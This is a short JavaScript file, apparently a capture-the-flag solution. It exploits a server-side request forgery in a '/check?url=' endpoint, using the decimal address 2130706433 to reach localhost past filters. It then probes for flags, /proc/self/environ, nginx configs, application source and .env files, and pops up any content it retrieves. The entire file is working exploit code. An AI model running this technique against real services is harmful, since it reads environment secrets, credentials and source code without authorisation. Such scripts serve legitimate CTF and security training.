// f2.js - XHR asincrono, mismo origen
function ssrf(path, callback) {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', '/check?url=' + encodeURIComponent('http://2130706433' + path), true);
  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
      callback(xhr.responseText);
    }
  };
  xhr.send();
}

function parseBody(xml) {
  var m = xml.match(/<body>([\s\S]*?)<\/body>/);
  if (!m) return xml;
  return m[1]
    .replace(/&amp;/g,'&')
    .replace(/&lt;/g,'<')
    .replace(/&gt;/g,'>')
    .replace(/&apos;/g,"'")
    .replace(/&quot;/g,'"');
}

var paths = [
  '/flag.txt',
  '/flag',
  '/proc/self/environ',
  '/proc/self/cmdline',
  '/etc/nginx/nginx.conf',
  '/etc/nginx/conf.d/default.conf',
  '/app/app.py',
  '/app/main.py',
  '/app/server.py',
  '/app/.env',
  '/.env',
  '/app/flag.txt',
  '/tmp/flag.txt',
  '/root/flag.txt',
];

paths.forEach(function(path) {
  ssrf(path, function(raw) {
    var body = parseBody(raw);
    if (body.includes('HCRD{')) {
      alert('FLAG: ' + body);
    } else if (
      !body.includes('Connection refused') &&
      !body.includes('not allowed') &&
      !body.includes('404') &&
      !body.includes('403') &&
      !body.includes('NetworkError') &&
      body.length > 20
    ) {
      alert('HIT [' + path + ']:\n' + body.substring(0, 1000));
    }
  });
});